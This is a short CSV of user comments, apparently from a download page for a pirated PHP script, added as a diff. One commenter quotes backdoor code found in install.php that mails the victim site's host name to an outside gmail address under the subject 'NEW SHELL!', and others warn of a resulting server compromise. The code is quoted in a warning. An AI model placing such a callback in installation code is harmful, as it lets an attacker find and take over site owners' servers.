@@ -1,0 +1,15 @@
+﻿User Type,Username,Date,Text
+,HiJ4CkP,2013-03-20T16:37Z,"When installing this I came across a syntax error in the install.php file, after investigating it appears to have this..
+
+$HOST = $_SERVER['HTTP_HOST'];
+$mail = ""borderlandsrulz@gmail.com"";
+$ondewerp = ""NEW SHELL!"";
+$bericht = ""$HOST"";
+mail(""$mail"",""$onderwerp"",""$bericht"");
+
+It appears this nulled version has a backdoor somewheres."
+,themacgenius,2013-05-06T16:56Z,"BEWARE! We had a client install this on her website and she had to hire us to restore her entire server because of the hacking that resulted because of the backdoor mentioned.
+
+DO NOT DOWNLOAD!"
+,themacgenius,2013-05-06T16:56Z,"And shame on you, darkman."
+,wandallo,2013-05-29T01:59Z,No Reclaims! Pay for it if u want support!!! 
